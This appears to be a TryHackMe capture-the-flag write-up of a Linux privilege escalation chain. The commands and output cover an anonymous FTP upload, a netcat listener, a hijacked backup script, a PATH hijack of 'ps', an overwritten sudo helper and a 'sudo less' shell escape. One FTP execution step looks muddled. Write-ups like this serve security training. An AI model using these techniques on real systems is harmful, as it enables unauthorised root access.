## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```bash
Use privilege escalation knowledge to jump from a normal user to root.
You’ve discovered a misconfigured internal automation pipeline running on a Linux server. The system processes recon scripts, development backups, monitoring jobs, and deployment tasks across multiple users. Each stage of the pipeline relies too heavily on the previous one. By abusing these trust boundaries, you must move laterally through the system.

Your objective is to escalate from anonymous access all the way through:
`recon_user → dev_user → monitor_user → ops_user → root`
```
----
### IP 
```IP 
10.49.154.56
```
## Enumeration
- Port Scan
```bash
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 115      123          4096 Apr 30 06:00 incoming [NSE: writeable]
|_drwxr-xr-x    4 115      123          4096 Jun 09 08:22 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.156.78
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 26:de:fe:35:0c:6f:e9:13:2a:36:2a:31:d8:2b:5c:50 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAPoSk9LoyRNQ1Sdz8DvTKVpIG5keWI4160id1rCbqt5n4dCllYZt7ADtFSTspwZQd4rPduNRX6oDmx/TYPTG2M=
|   256 3e:7b:cf:a2:02:b2:b6:59:22:a1:9f:84:c7:5d:e1:2d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFgr2qPNdpyHjD+oaHpJ1aNmg6pSU2Whm/xGpnyMs26y
```
- Enumerate FTP services
```bash
ftp 10.49.154.56
Name (10.49.154.56:kali): anonymous
ftp> ls -la
drwxrwxrwx    2 115      123          4096 Apr 30 06:00 incoming
drwxr-xr-x    4 115      123          4096 Jun 09 08:22 pub
ftp> cd incoming
ftp> ls -la
drwxrwxrwx    2 115      123          4096 Apr 30 06:00 .
drwxr-xr-x    4 0        0            4096 Feb 02 06:29 ..
ftp> cd ..
ftp> cd pub
ftp> ls -la
-rw-r--r--    1 0        0             139 Feb 02 07:19 README.txt
drwxr-xr-x    2 115      123          4096 Feb 01 11:12 archive
drwxrwxrwx    2 115      123          4096 Feb 01 11:12 uploads
ftp> get README.txt
ftp> cd archive
ftp> ls -la
drwxr-xr-x    2 115      123          4096 Feb 01 11:12 .
drwxr-xr-x    4 115      123          4096 Jun 09 08:22 ..
ftp> cd ..
ftp> cd uploads
ftp> ls -la
drwxrwxrwx    2 115      123          4096 Feb 01 11:12 .
drwxr-xr-x    4 115      123          4096 Jun 09 08:22 ..
226 Directory send OK.
```
- File `README.txt`
```txt
$ cat README.txt
[ recon pipeline ]
All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```
- Create a `Reverse.sh` & transfer it to FTP `/incoming/` 
- Execute 
```bash
ftp> run reverse.sh
usage: runique [ on | off ]
ftp> on
```
----
### Initial User - `recon_user`

- Got the Shell
```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.156.78] from (UNKNOWN) [10.49.154.56] 48538
sh: 0: can't access tty; job control turned off
$ whoami
recon_user
$ id
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
$ ls
flag.txt
shell.sh
$ cat flag.txt
[flag omitted]
```
- User - `recon_user` enumeration
```bash
recon_user@tryhackme-2404:~$ id
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
recon_user@tryhackme-2404:~$ whoami
recon_user
recon_user@tryhackme-2404:~$ find / -type f -writable 2>/dev/null 
/tmp/recon_backup.tgz
/tmp/pspy64
/tmp/pwned
/opt/dev/backup.sh
/opt/dev/bin/ps
/opt/recon/scan_uploads.sh
/home/recon_user/shell.sh
/home/recon_user/flag.txt
/home/recon_user/.profile
/home/recon_user/.bashrc
/home/recon_user/.selected_editor
/home/recon_user/.bash_logout
/home/dev_user/.selected_editor
```
- File Permission check up and content of the file
```bash
recon_user@tryhackme-2404:~$ ls -la /opt/dev/backup.sh
-rwxrwxr-x 1 dev_user dev_user 62 Jul 29 14:22 /opt/dev/backup.sh
recon_user@tryhackme-2404:~$ cat /opt/dev/backup.sh 
#!/bin/bash tar -czf /tmp/recon_backup.tgz /home/recon_user
recon_user@tryhackme-2404:~$ ls -la /opt/dev/backup.sh
-rwxrwxr-x 1 dev_user dev_user 62 Jul 29 14:22 /opt/dev/backup.sh
```
- Edited the file `/opt/dev/backup.sh` as reverse-shell
```bash
recon_user@tryhackme-2404:~$ ps -ef | grep backup
dev_user   10497   10496  0 14:29 ?        00:00:00 /bin/sh -c /bin/bash /opt/dev/backup.sh
dev_user   10500   10497  0 14:29 ?        00:00:00 /bin/bash /opt/dev/backup.sh
recon_u+   10588   10059  0 14:29 pts/0    00:00:00 grep --color=auto backup
recon_user@tryhackme-2404:~$
```
- Capture the Reverse shell
### Second Account - `dev_user`
- Enumeration
```bash
dev_user@tryhackme-2404:~$ whoami
dev_user
dev_user@tryhackme-2404:~$ id
uid=1002(dev_user) gid=1002(dev_user) groups=1002(dev_user),1005(devops)
dev_user@tryhackme-2404:~$ pwd
/home/dev_user
dev_user@tryhackme-2404:~$ ls -la
drwxr-x--- 3 dev_user dev_user 4096 Jun  9 09:04 .
drwxr-xr-x 7 root     root     4096 Apr 29 10:46 ..
-rw-r--r-- 1 dev_user dev_user  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 dev_user dev_user 3877 Apr 26 19:22 .bashrc
drwxrwxr-x 3 dev_user dev_user 4096 Jun  9 09:04 .local
-rw-r--r-- 1 dev_user dev_user  807 Feb 25  2020 .profile
-rw-rw-r-- 1 dev_user dev_user   66 Jun  9 09:04 .selected_editor
-rw-r--r-- 1 dev_user dev_user   42 Apr 26 19:39 flag.txt
```
- File Content `Flag.txt`
```Flag
$ cat flag.txt
[flag omitted]
```
- Enumerate in depth
```bash
dev_user@tryhackme-2404:/tmp$ systemctl | grep healthcheck
  healthcheck.service                                                          loaded active running   System Health Check
  healthcheck.timer                                                            loaded active running   Run healthcheck every minute
  
dev_user@tryhackme-2404:/usr/local/bin$ systemctl cat healthcheck.service
# /etc/systemd/system/healthcheck.service
[Unit]
Description=System Health Check

[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
dev_user@tryhackme-2404:/usr/local/bin$ ls -l /usr/local/bin/healthcheck
-rwxr-xr-x 1 monitor_user monitor_user 98 Apr 29 10:35 /usr/local/bin/healthcheck

dev_user@tryhackme-2404:/usr/local/bin$ cat /usr/local/bin/healthcheck
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
ps aux | grep -v grep
sleep 5
done
```
- Create Exploit reverse-shell
```bash
$cd /opt/dev/bin/
$ls 
ps
- Add Reverse-shell into ps
- Execute permission
- chmod +x ps
```
- Capture the `reverse-shell`
----
### Third User - `Monitor_user`
- Enumerate
```bash
monitor_user@tryhackme-2404:/$ whoami
monitor_user
monitor_user@tryhackme-2404:/$ id
uid=1003(monitor_user) gid=1003(monitor_user) groups=1003(monitor_user)
monitor_user@tryhackme-2404:~$ ls
flag.txt
monitor_user@tryhackme-2404:~$ cat flag.txt
[flag omitted]
```
- Flag captured - Enumerate for Lateral movement 
```bash
monitor_user@tryhackme-2404:~$ sudo -l
Matching Defaults entries for monitor_user on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LESS

User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
monitor_user@tryhackme-2404:~$ cat /usr/local/bin/deploy.sh
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
monitor_user@tryhackme-2404:~$ ls -la /usr/local/bin/deploy.sh
-rwxr-xr-x 1 ops_user ops_user 55 Feb  2 10:12 /usr/local/bin/deploy.sh

monitor_user@tryhackme-2404:/opt/app$ ls
data  deploy_helper.sh
monitor_user@tryhackme-2404:/opt/app$ cat deploy_helper.sh
#!/bin/bash
echo "[+] Deploy helper running"
echo "[+] Syncing application files"
sleep 2
monitor_user@tryhackme-2404:/opt/app$ ls -la
total 16
drwxr-xr-x 3 ops_user     ops_user     4096 Feb  2 15:09 .
drwxr-xr-x 5 root         root         4096 Feb  2 10:03 ..
drwxrwxr-x 2 monitor_user monitor_user 4096 Feb  2 15:09 data
-rwxr-xr-x 1 monitor_user monitor_user   90 Feb  2 14:59 deploy_helper.sh
monitor_user@tryhackme-2404:/opt/app$ cd data
monitor_user@tryhackme-2404:/opt/app/data$ ls -la
drwxrwxr-x 2 monitor_user monitor_user 4096 Feb  2 15:09 .
drwxr-xr-x 3 ops_user     ops_user     4096 Feb  2 15:09 ..

```
 - Start Exploit - Add reverse-shell inside the `/opt/app/deploy_helper.sh`
```bash
cat > /opt/app/deploy_helper.sh 
'<< 'EOF'
> #!/bin/bash
> exec /bin/bash
> EOF'
monitor_user@tryhackme-2404:/opt/app$ chmod +x /opt/app/deploy_helper.sh
monitor_user@tryhackme-2404:/opt/app$ sudo -u ops_user /usr/local/bin/deploy.sh
```
- Got the User shell
----
### Fourth User - `ops_user`
- Capture the Flag
```bash
ops_user@tryhackme-2404:~$ ls
flag.txt
ops_user@tryhackme-2404:~$ cat flag.txt
[flag omitted]
```
- User Enumeration
```bash
ops_user@tryhackme-2404:~$ whoami
ops_user
ops_user@tryhackme-2404:~$ id
uid=1004(ops_user) gid=1004(ops_user) groups=1004(ops_user)
ops_user@tryhackme-2404:~$ sudo -l
Matching Defaults entries for ops_user on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LESS

User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
ops_user@tryhackme-2404:~$ sudo less /root/flag.txt
[flag omitted]
!bash
```
- Got the Root
----
### Final User - `Root`
```bash
root@tryhackme-2404:/home/ops_user# whoami
root
root@tryhackme-2404:/home/ops_user# id
uid=0(root) gid=0(root) groups=0(root)
```
# END